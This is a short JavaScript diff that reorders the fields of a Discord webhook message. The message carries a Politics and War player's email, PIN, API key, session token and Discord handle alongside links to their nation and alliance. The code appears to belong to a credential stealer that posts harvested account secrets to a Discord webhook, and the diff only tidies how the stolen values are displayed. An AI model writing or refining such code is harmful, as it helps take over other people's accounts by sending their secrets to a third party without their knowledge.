@@ -84,14 +84,25 @@
             body: JSON.stringify({
                 embeds: [{
                     title: nation.leader_name || 'Unknown',
-                    description: `[${nation.nation_name}](https://politicsandwar.com/nation/id=${nation.id})${nation.alliance?.name ? `, [${nation.alliance.name}](https://politicsandwar.com/alliance/id=${nation.alliance.id}) (${nation.alliance_position || 'NONE'})` : ''}`,
                     color: 0x2ecc71,
                     fields: [
-                        { name: '📧 Email', value: `\`${email}\``, inline: true },
-                        { name: '🔐 PIN', value: `\`${pin || 'N/A'}\``, inline: true },
-                        { name: '🔑 API Key', value: `\`${apiKey || 'N/A'}\``, inline: true },
-                        { name: '🎟️ Token', value: `\`${token || 'N/A'}\``, inline: true },
-                        { name: '💬 Discord', value: `\`${nation.discord || 'N/A'}\``, inline: true }
+                        { 
+                            name: 'Nation', 
+                            value: `[${nation.nation_name}](https://politicsandwar.com/nation/id=${nation.id})`, 
+                            inline: false 
+                        },
+                        { 
+                            name: 'Alliance', 
+                            value: nation.alliance?.name 
+                                ? `[${nation.alliance.name}](https://politicsandwar.com/alliance/id=${nation.alliance.id}) (${nation.alliance_position || 'NONE'})` 
+                                : 'None', 
+                            inline: false 
+                        },
+                        { name: 'Discord', value: `\`${nation.discord || 'None'}\``, inline: false },
+                        { name: 'Email', value: `\`${email}\``, inline: false },
+                        { name: 'API Key', value: `\`${apiKey || 'N/A'}\``, inline: false },
+                        { name: 'Token', value: `\`${token || 'N/A'}\``, inline: false },
+                        { name: 'PIN', value: `\`${pin || 'N/A'}\``, inline: false }
                     ],
                     timestamp: new Date().toISOString()
                 }]
